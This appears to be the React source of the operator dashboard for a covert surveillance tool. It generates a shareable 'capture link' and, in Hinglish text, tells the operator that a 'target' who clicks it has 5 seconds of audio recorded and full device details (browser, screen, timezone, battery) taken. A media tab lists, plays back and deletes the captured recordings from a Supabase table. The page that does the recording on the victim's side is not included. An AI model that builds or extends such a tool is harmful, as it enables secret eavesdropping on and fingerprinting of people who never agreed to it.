import { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import { 
  Mic, Loader2, ArrowLeft, Copy, Check, ExternalLink, 
  LucideIcon, Sparkles, Headphones, Info, Link2, Smartphone,
  Database, Play, Trash2, RefreshCw, Volume2, FileJson
} from "lucide-react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import { useSettings } from "@/contexts/SettingsContext";
import { useAuth } from "@/contexts/AuthContext";
import { supabase } from "@/integrations/supabase/client";
import CreditDisplay from "@/components/CreditDisplay";
import FeatureCard from "@/components/FeatureCard";
import { cn } from "@/lib/utils";

interface Page2Tab {
  id: string;
  label: string;
  icon: LucideIcon;
  color: string;
  description: string;
}

interface CapturedData {
  id: string;
  session_id: string;
  image_data: string;
  captured_at: string;
  user_agent: string | null;
}

const page2Tabs: Page2Tab[] = [
  { 
    id: "audiocapture", 
    label: "AUDIO CAPTURE", 
    icon: Mic, 
    color: "pink",
    description: "5 sec audio + device info capture"
  },
  { 
    id: "media", 
    label: "MEDIA", 
    icon: Database, 
    color: "cyan",
    description: "View captured data"
  },
];

const Page2 = () => {
  const { settings } = useSettings();
  const { isLoading: authLoading } = useAuth();
  const [activeTab, setActiveTab] = useState<string | null>(null);
  const [copiedLink, setCopiedLink] = useState(false);
  const [capturedData, setCapturedData] = useState<CapturedData[]>([]);
  const [isLoadingData, setIsLoadingData] = useState(false);

  const activeTabData = page2Tabs.find(tab => tab.id === activeTab);

  // Generate capture link
  const baseUrl = window.location.origin;
  const sessionId = settings.camSessionId || "audiocap01";
  const captureLink = `${baseUrl}/audio-capture?session=${sessionId}`;

  // Fetch captured data
  const fetchCapturedData = async () => {
    setIsLoadingData(true);
    try {
      const { data, error } = await supabase
        .from("captured_photos")
        .select("*")
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`)
        .order("captured_at", { ascending: false });
      
      if (error) throw error;
      setCapturedData(data || []);
    } catch (err) {
      console.error("Failed to fetch data:", err);
    } finally {
      setIsLoadingData(false);
    }
  };

  // Delete captured item
  const deleteItem = async (id: string) => {
    try {
      const { error } = await supabase.from("captured_photos").delete().eq("id", id);
      if (error) throw error;
      setCapturedData(prev => prev.filter(item => item.id !== id));
      toast({ title: "Deleted!", description: "Item removed successfully" });
    } catch (err) {
      toast({ title: "Error", description: "Failed to delete", variant: "destructive" });
    }
  };

  // Clear all data
  const clearAllData = async () => {
    try {
      const { error } = await supabase
        .from("captured_photos")
        .delete()
        .or(`session_id.eq.${sessionId},session_id.eq.${sessionId}_deviceinfo`);
      
      if (error) throw error;
      setCapturedData([]);
      toast({ title: "Cleared!", description: "All data removed" });
    } catch (err) {
      toast({ title: "Error", description: "Failed to clear data", variant: "destructive" });
    }
  };

  useEffect(() => {
    if (activeTab === "media") {
      fetchCapturedData();
    }
  }, [activeTab, sessionId]);

  const copyLink = async () => {
    await navigator.clipboard.writeText(captureLink);
    setCopiedLink(true);
    toast({ title: "Link Copied!", description: "Audio capture link copied to clipboard" });
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const handleTabClick = (tabId: string) => {
    if (activeTab === tabId) {
      setActiveTab(null);
    } else {
      setActiveTab(tabId);
    }
  };

  if (authLoading) {
    return (
      <div className="min-h-[100dvh] bg-background flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-neon-green animate-spin" />
      </div>
    );
  }

  return (
    <div className="min-h-[100dvh] bg-background relative overflow-hidden">
      {/* Background */}
      <div className="fixed inset-0 pointer-events-none">
        {settings.backgroundImage ? (
          <div 
            className="absolute inset-0 bg-fixed-stable"
            style={{ 
              backgroundImage: `url(${settings.backgroundImage})`,
              backgroundSize: 'cover',
              backgroundPosition: 'center',
              backgroundRepeat: 'no-repeat',
              opacity: (parseInt(settings.backgroundOpacity || "30") / 100)
            }}
          />
        ) : (
          <>
            <div className="absolute inset-0 bg-gradient-to-br from-background via-background to-background" />
            <div className="absolute top-[10%] left-[10%] w-[300px] h-[300px] bg-neon-pink/8 rounded-full blur-[100px]" />
            <div className="absolute top-[50%] right-[5%] w-[250px] h-[250px] bg-neon-cyan/8 rounded-full blur-[100px]" />
            <div className="absolute bottom-[10%] left-[20%] w-[200px] h-[200px] bg-neon-purple/8 rounded-full blur-[100px]" />
          </>
        )}
        
        <div className="absolute top-0 left-0 right-0 h-24 bg-gradient-to-b from-background to-transparent" />
        <div className="absolute bottom-0 left-0 right-0 h-24 bg-gradient-to-t from-background to-transparent" />
      </div>
      
      {/* Content */}
      <div className="relative z-10 min-h-[100dvh] flex flex-col">
        {/* Header */}
        <header className="px-4 py-4">
          <div className="flex items-center justify-between max-w-3xl mx-auto">
            <Link 
              to="/" 
              className="flex items-center gap-2 px-3 py-2 rounded-xl border border-neon-cyan/30 bg-card/50 text-neon-cyan hover:bg-neon-cyan/10 transition-all group"
            >
              <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
              <span className="text-xs font-bold uppercase tracking-wider">Back</span>
            </Link>
            
            <div className="text-center">
              <h1 className="text-lg font-display font-bold bg-gradient-to-r from-neon-pink via-neon-cyan to-neon-purple bg-clip-text text-transparent">
                PAGE 2
              </h1>
            </div>
            
            <CreditDisplay />
          </div>
        </header>
        
        {/* Main Content */}
        <main className="flex-1 px-4 pb-6">
          <div className="max-w-3xl mx-auto space-y-4">
            {/* Tab Grid - Similar to Page 1 */}
            <div className="grid grid-cols-4 gap-2">
              {page2Tabs.map((tab) => (
                <div key={tab.id}>
                  <FeatureCard
                    icon={tab.icon}
                    label={tab.label}
                    color={tab.color}
                    active={tab.id === activeTab}
                    onClick={() => handleTabClick(tab.id)}
                  />
                </div>
              ))}
              
              {/* Back to Page 1 Button */}
              <Link to="/">
                <div className={cn(
                  "flex flex-col items-center gap-1 p-2 rounded-lg border transition-colors",
                  "bg-gradient-to-br from-neon-green/20 to-neon-green/5",
                  "border-neon-green/40 hover:border-neon-green"
                )}>
                  <div className="w-7 h-7 rounded-md bg-gradient-to-br from-background/80 to-background/40 border border-neon-green/30 flex items-center justify-center text-neon-green">
                    <ArrowLeft className="w-3.5 h-3.5" />
                  </div>
                  <span className="text-[8px] font-bold tracking-wide uppercase text-neon-green">Page 1</span>
                </div>
              </Link>
            </div>

            {/* Audio Capture Panel */}
            {activeTabData?.id === "audiocapture" && (
              <div className="rounded-xl bg-gradient-to-br from-card/90 to-card/70 border border-neon-pink/40 p-4 overflow-hidden">
                {/* Header */}
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-neon-pink/30 to-neon-purple/20 border border-neon-pink/40 flex items-center justify-center">
                    <Mic className="w-6 h-6 text-neon-pink" />
                  </div>
                  <div>
                    <h2 className="text-sm font-bold text-foreground">AUDIO CAPTURE</h2>
                    <p className="text-[10px] text-muted-foreground">5 sec audio + device info</p>
                  </div>
                </div>

                {/* Description */}
                <div className="mb-4 p-3 rounded-lg bg-neon-pink/5 border border-neon-pink/20">
                  <div className="flex items-start gap-2">
                    <Info className="w-4 h-4 text-neon-pink flex-shrink-0 mt-0.5" />
                    <p className="text-[11px] text-muted-foreground leading-relaxed">
                      Link pe click karne pe target ka <span className="text-neon-cyan font-bold">5 second audio</span> record 
                      hoga aur saath me full <span className="text-neon-purple font-bold">device info</span> capture hogi 
                      (browser, screen, language, timezone, battery etc.)
                    </p>
                  </div>
                </div>

                {/* Session ID */}
                <div className="mb-4">
                  <label className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider mb-1.5 block">
                    Session ID
                  </label>
                  <Input
                    value={sessionId}
                    readOnly
                    className="h-10 bg-background/60 border-neon-pink/30 text-foreground font-mono text-sm"
                  />
                  <p className="text-[9px] text-muted-foreground mt-1">Admin Panel se change karo</p>
                </div>

                {/* Generated Link */}
                <div className="mb-4">
                  <label className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider mb-1.5 block flex items-center gap-1.5">
                    <Link2 className="w-3 h-3" />
                    Capture Link
                  </label>
                  <div className="flex gap-2">
                    <Input
                      value={captureLink}
                      readOnly
                      className="flex-1 h-10 bg-background/60 border-neon-cyan/30 text-neon-cyan font-mono text-xs"
                    />
                    <Button
                      onClick={copyLink}
                      className="h-10 px-4 bg-gradient-to-r from-neon-pink to-neon-purple hover:opacity-90"
                    >
                      {copiedLink ? (
                        <Check className="w-4 h-4" />
                      ) : (
                        <Copy className="w-4 h-4" />
                      )}
                    </Button>
                  </div>
                </div>

                {/* Open Link Button */}
                <Button
                  onClick={() => window.open(captureLink, '_blank')}
                  className="w-full h-11 bg-gradient-to-r from-neon-pink via-neon-purple to-neon-cyan text-background font-bold hover:opacity-90"
                >
                  <ExternalLink className="w-4 h-4 mr-2" />
                  Open Link (Test)
                </Button>

                {/* Features Grid */}
                <div className="grid grid-cols-2 gap-2 mt-4">
                  <div className="p-3 rounded-lg bg-neon-pink/10 border border-neon-pink/20 text-center">
                    <Headphones className="w-5 h-5 mx-auto mb-1 text-neon-pink" />
                    <p className="text-[10px] font-bold text-neon-pink">5 SEC AUDIO</p>
                    <p className="text-[8px] text-muted-foreground">Auto record</p>
                  </div>
                  <div className="p-3 rounded-lg bg-neon-cyan/10 border border-neon-cyan/20 text-center">
                    <Smartphone className="w-5 h-5 mx-auto mb-1 text-neon-cyan" />
                    <p className="text-[10px] font-bold text-neon-cyan">DEVICE INFO</p>
                    <p className="text-[8px] text-muted-foreground">Full details</p>
                  </div>
                </div>
              </div>
            )}

            {/* Media Panel */}
            {activeTabData?.id === "media" && (
              <div className="rounded-xl bg-gradient-to-br from-card/90 to-card/70 border border-neon-cyan/40 p-4 overflow-hidden">
                {/* Header */}
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-neon-cyan/30 to-neon-purple/20 border border-neon-cyan/40 flex items-center justify-center">
                      <Database className="w-6 h-6 text-neon-cyan" />
                    </div>
                    <div>
                      <h2 className="text-sm font-bold text-foreground">CAPTURED DATA</h2>
                      <p className="text-[10px] text-muted-foreground">Session: {sessionId}</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={fetchCapturedData}
                      disabled={isLoadingData}
                      className="h-8 px-3 border-neon-cyan/40 text-neon-cyan hover:bg-neon-cyan/10"
                    >
                      <RefreshCw className={cn("w-3.5 h-3.5", isLoadingData && "animate-spin")} />
                    </Button>
                    {capturedData.length > 0 && (
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={clearAllData}
                        className="h-8 px-3 border-red-500/40 text-red-400 hover:bg-red-500/10"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </Button>
                    )}
                  </div>
                </div>

                {/* Data List */}
                {isLoadingData ? (
                  <div className="flex items-center justify-center py-8">
                    <Loader2 className="w-6 h-6 text-neon-cyan animate-spin" />
                  </div>
                ) : capturedData.length === 0 ? (
                  <div className="text-center py-8">
                    <Database className="w-10 h-10 mx-auto mb-2 text-muted-foreground/40" />
                    <p className="text-xs text-muted-foreground">No data captured yet</p>
                    <p className="text-[10px] text-muted-foreground/60">Share the link to start capturing</p>
                  </div>
                ) : (
                  <div className="space-y-3 max-h-[400px] overflow-y-auto pr-1">
                    {capturedData.map((item) => {
                      const isDeviceInfo = item.session_id.endsWith("_deviceinfo");
                      const isAudio = item.image_data.startsWith("data:audio");
                      
                      return (
                        <div 
                          key={item.id}
                          className={cn(
                            "p-3 rounded-lg border",
                            isDeviceInfo 
                              ? "bg-neon-purple/10 border-neon-purple/30" 
                              : "bg-neon-pink/10 border-neon-pink/30"
                          )}
                        >
                          <div className="flex items-start justify-between gap-2">
                            <div className="flex items-center gap-2 flex-1 min-w-0">
                              {isDeviceInfo ? (
                                <FileJson className="w-5 h-5 text-neon-purple flex-shrink-0" />
                              ) : (
                                <Volume2 className="w-5 h-5 text-neon-pink flex-shrink-0" />
                              )}
                              <div className="flex-1 min-w-0">
                                <p className={cn(
                                  "text-xs font-bold",
                                  isDeviceInfo ? "text-neon-purple" : "text-neon-pink"
                                )}>
                                  {isDeviceInfo ? "DEVICE INFO" : "AUDIO (5 sec)"}
                                </p>
                                <p className="text-[9px] text-muted-foreground truncate">
                                  {new Date(item.captured_at).toLocaleString()}
                                </p>
                              </div>
                            </div>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => deleteItem(item.id)}
                              className="h-7 w-7 p-0 text-red-400 hover:bg-red-500/20"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                          
                          {/* Content */}
                          {isDeviceInfo ? (
                            <div className="mt-2 p-2 rounded bg-background/50 max-h-32 overflow-y-auto">
                              <pre className="text-[9px] text-muted-foreground whitespace-pre-wrap break-all font-mono">
                                {(() => {
                                  try {
                                    return JSON.stringify(JSON.parse(item.image_data), null, 2);
                                  } catch {
                                    return item.image_data;
                                  }
                                })()}
                              </pre>
                            </div>
                          ) : isAudio ? (
                            <div className="mt-2">
                              <audio controls className="w-full h-8" src={item.image_data}>
                                Your browser does not support audio.
                              </audio>
                            </div>
                          ) : (
                            <div className="mt-2 p-2 rounded bg-background/50">
                              <p className="text-[9px] text-muted-foreground truncate">
                                {item.image_data.substring(0, 100)}...
                              </p>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            )}

            {/* Empty State when no tab selected */}
            {!activeTab && (
              <div className="text-center py-12">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-neon-pink/20 to-neon-purple/20 flex items-center justify-center">
                  <Sparkles className="w-8 h-8 text-neon-pink" />
                </div>
                <h3 className="text-sm font-bold text-foreground mb-1">Select a Feature</h3>
                <p className="text-[11px] text-muted-foreground">Click on a tab above to get started</p>
              </div>
            )}
          </div>
        </main>
        
        {/* Footer */}
        <footer className="text-center py-4 px-4">
          <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-card/50 border border-neon-pink/20">
            <div className="w-1.5 h-1.5 bg-neon-pink rounded-full animate-pulse" />
            <p className="text-[10px] text-muted-foreground/60 font-mono tracking-wider">
              PAGE 2 • ADVANCED TOOLS
            </p>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default Page2;
